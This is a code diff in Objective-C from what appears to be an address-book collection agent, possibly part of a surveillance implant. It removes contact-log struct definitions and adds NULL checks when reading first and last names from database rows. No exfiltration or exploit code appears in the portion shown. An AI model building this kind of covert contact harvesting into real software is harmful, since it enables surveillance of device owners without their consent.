@@ -21,46 +21,6 @@ int seteuid(uid_t euid);
 
 NSString *k_i_AgentAddressBookRunLoopMode = @"k_i_AgentAddressBookRunLoopMode";
 
-typedef struct _Names {
-#define CONTACTNAME   0xC025
-  int     magic;  
-  int     len;
-  //wchar_t buffer[1];
-} Names;
-
-typedef struct _ABNumbers {
-#define CONTACTNUM    0xC024  
-  int     magic;
-  int     type;
-  //Names   number;
-} ABNumbers;
-
-typedef struct _ABContats {
-#define CONTACTCNT    0xC023 
-  int         magic;
-  int         numContats;
-  //ABNumbers contact[1];
-} ABContats;
-
-typedef struct _ABFile {
-#define CONTACTFILE   0xC022
-  int       magic;
-  int       flag; //= 0x80000000 if ourself
-  int       len;
-  //Names      first;
-  //Names      last;
-  //ABContacts contact[1];
-} ABFile;
-
-typedef struct _ABLogStrcut {
-#define   CONTACTLIST   0xC021
-#define   CONTACTLIST_2 0x1000C021
-  int     magic;
-  int     len;
-  int     numRecords;
-  //ABFile  file[1];
-} ABLogStrcut;
-
 #define ALL_ADDRESS (NSTimeInterval)0
 #define CFRELEASE(x) {if(x!=NULL)CFRelease(x);}
 
@@ -639,10 +599,17 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
     {
       NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
       
+      NSString *firstName = @"";
+      NSString *lastName  = @"";
+      
       sscanf(result[ncol + i], "%ld", (long*)&rowid);
       
-      NSString *firstName = [NSString stringWithUTF8String: result[ncol + i + 1]];
-      NSString *lastName  = [NSString stringWithUTF8String: result[ncol + i + 2]];
+      if (result[ncol + i + 1] != NULL)
+        firstName = [NSString stringWithUTF8String: result[ncol + i + 1]];
+      
+      if (result[ncol + i + 2] != NULL)
+        lastName  = [NSString stringWithUTF8String: result[ncol + i + 2]];
+      
       NSMutableArray *numbers = [self getContactNumbers: rowid];
       
       NSString *isMyNumber = @"NO";
